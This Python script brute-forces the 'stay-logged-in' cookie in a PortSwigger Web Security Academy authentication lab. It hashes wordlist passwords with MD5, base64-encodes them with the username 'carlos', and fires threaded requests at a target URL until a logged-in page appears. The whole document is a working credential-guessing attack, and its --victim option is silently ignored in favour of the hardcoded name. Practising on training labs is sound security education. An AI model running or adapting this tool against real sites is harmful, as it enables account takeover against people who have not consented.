#!/usr/bin/env python3
"""
Brute-force stay-logged-in cookie (threaded).
PortSwigger: Authentication - Staying logged in.

Logic: encode carlos:md5(password) as base64, send as cookie.
If response does NOT contain "Log in" → found.

Usage:
  python3 brute_stay_logged_in.py \
    --url https://0a38001b047198bf81ec4de100ff00a0.web-security-academy.net \
    --session h826pmhwmUE0tzA8p8tCgChCh41CmBJTrU \
    --victim carlos \
    --passwords passwords.txt \
    --cookie stay-logged-in \
    --threads 20 \
    --delay 0.2
"""

import argparse
import sys
import time
from hashlib import md5
from base64 import b64encode
from threading import Thread
from pathlib import Path

import requests


def fetch_passwords(filename):
    """Read passwords and encode as base64(carlos:md5(password))."""
    cookies = []
    with open(filename) as f:
        for line in f:
            pw = line.strip().encode("utf-8")
            if not pw:
                continue
            h = md5(pw).hexdigest()
            encoded = b64encode(f"carlos:{h}".encode("utf-8")).decode("ascii")
            cookies.append((pw.decode("utf-8", errors="replace"), encoded))
    return cookies


def send_request(url, session_val, cookie_name, cookie_value, password, results):
    """Send request with stay-logged-in cookie."""
    cookies = {
        "session": session_val,
        cookie_name: cookie_value,
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0",
    }
    try:
        resp = requests.get(url, cookies=cookies, headers=headers, timeout=10, allow_redirects=True)
        if "Log in" not in resp.text:
            results.append((password, cookie_value))
            print(f"[+] Found! Password: {password} | Cookie: {cookie_value}")
    except Exception as e:
        pass


def main():
    parser = argparse.ArgumentParser(description="Brute-force stay-logged-in cookie")
    parser.add_argument("--url", required=True, help="Target URL (e.g. https://xxx.web-security-academy.net/my-account)")
    parser.add_argument("--session", required=True, help="Valid session cookie value")
    parser.add_argument("--victim", default="carlos", help="Victim username")
    parser.add_argument("--passwords", required=True, help="Password wordlist path")
    parser.add_argument("--cookie", default="stay-logged-in", help="Cookie name")
    parser.add_argument("--threads", type=int, default=20, help="Number of threads")
    parser.add_argument("--delay", type=float, default=0.2, help="Delay between thread starts")
    args = parser.parse_args()

    # Read passwords
    pw_path = Path(args.passwords)
    if not pw_path.exists():
        print(f"ERROR: File not found: {pw_path}")
        sys.exit(1)

    cookies = fetch_passwords(str(pw_path))
    print(f"Loaded {len(cookies)} passwords from {pw_path}")
    print(f"Target: {args.url}")
    print(f"Victim: {args.victim}")
    print(f"Threads: {args.threads}")
    print()

    results = []
    threads = []

    for password, cookie_val in cookies:
        t = Thread(
            target=send_request,
            args=(args.url, args.session, args.cookie, cookie_val, password, results),
        )
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(args.delay)

    # Wait for all threads
    for t in threads:
        t.join(timeout=30)

    print()
    if results:
        print("=" * 60)
        print(f"SUCCESS! Found {len(results)} valid cookie(s):")
        for pw, ck in results:
            print(f"  Password: {pw}")
            print(f"  Cookie:   {args.cookie}={ck}")
        print("=" * 60)
    else:
        print("No valid cookie found. Password not in wordlist.")


if __name__ == "__main__":
    main()